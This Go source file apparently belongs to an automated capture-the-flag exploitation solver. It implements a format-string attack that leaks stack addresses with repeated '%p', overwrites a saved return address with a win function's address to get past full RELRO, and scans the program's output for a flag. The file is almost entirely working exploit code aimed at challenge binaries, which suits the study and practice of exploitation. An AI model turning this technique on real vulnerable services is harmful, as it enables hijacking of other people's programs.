package solve

import (
	"bytes"
	"context"
	"fmt"
	"strconv"
	"strings"

	"github.com/MoriartyPuth/PwnProbes/internal/runner"
)

// fmtWriteRetStrategy defeats full RELRO (a read-only GOT) for a looping
// format-string program by writing the win address onto a saved return address
// on the stack, which stays writable. In one connection it leaks the stack, then
// writes the win address over a candidate return slot (a leaked frame pointer
// plus 8), then exits the loop so the function returns into win. The loop lets
// the leak and the write share a run, so the leaked addresses are still valid.
// A single-shot format string cannot reach the stack this way (ASLR), and that is
// reported rather than attempted.
func (s *solver) fmtWriteRetStrategy(ctx context.Context) (bool, error) {
	bin := s.report.Binary
	if bin.Bits != 64 || bin.Protections["pie"].Status == "enabled" {
		return false, nil
	}
	if !hasFormatString(s.report.Detection) {
		return false, nil
	}
	wins := orderedWinFunctions(bin)
	if len(wins) == 0 {
		return false, nil
	}
	if len(wins) > 3 {
		wins = wins[:3]
	}
	off := s.probeFmtOffset(ctx)
	if off == 0 {
		return false, nil
	}
	for _, win := range wins {
		low := []byte{byte(win.addr), byte(win.addr >> 8), byte(win.addr >> 16)} // low 3 bytes
		for vIdx := 0; vIdx < 16; vIdx++ {
			if err := ctx.Err(); err != nil {
				return false, err
			}
			done, err := s.fmtWriteRetAttempt(ctx, off, vIdx, win, low)
			if err != nil || done {
				return done, err
			}
		}
	}
	return false, nil
}

func (s *solver) fmtWriteRetAttempt(ctx context.Context, off, vIdx int, win funcEntry, low []byte) (bool, error) {
	conn, cleanup, err := s.open(ctx)
	if err != nil {
		return false, err
	}
	defer cleanup()
	defer conn.Close()
	_ = conn.RecvUntilIdle(s.idle())

	var dump strings.Builder
	for i := 0; i < 40; i++ {
		dump.WriteString("%p|")
	}
	if conn.Send([]byte(dump.String()+"\n")) != nil {
		return false, nil
	}
	leak := string(conn.RecvUntilIdle(s.idle()))
	stacks := parseStackValues(leak)
	if vIdx >= len(stacks) {
		return false, nil
	}
	target := stacks[vIdx] + 8 // a saved return address sits one word above a saved frame pointer

	payload := fmtstrWrite(off, target, low)
	if payload == nil || bytes.IndexByte(payload, '\n') >= 0 {
		return false, nil
	}
	if conn.Send(append(payload, '\n')) != nil {
		return false, nil
	}
	mid := string(conn.RecvUntilIdle(s.idle()))
	_ = conn.Send([]byte("q\n")) // leave the loop so the function returns
	post := string(conn.RecvUntilIdle(s.idle()))
	out := leak + mid + post

	marker := []byte("fmt-write-ret") // our sends never contain the flag
	cands := s.ex.Find(out, marker, "session")
	note := fmt.Sprintf("offset=%d vidx=%d target=%#x win=%#x(%s)", off, vIdx, target, win.addr, win.name)
	return s.finalize("fmt_write_ret", note, payload, runner.Result{Outcome: "session", ExitCode: -1, Stdout: out}, cands), nil
}

// parseStackValues returns the stack-range pointer values in a leak, in order.
func parseStackValues(out string) []uint64 {
	var vs []uint64
	for _, m := range leakRe.FindAllString(out, -1) {
		n, err := strconv.ParseUint(m[2:], 16, 64)
		if err == nil && n >= 0x7f0000000000 && n < 0x800000000000 {
			vs = append(vs, n)
		}
	}
	return vs
}
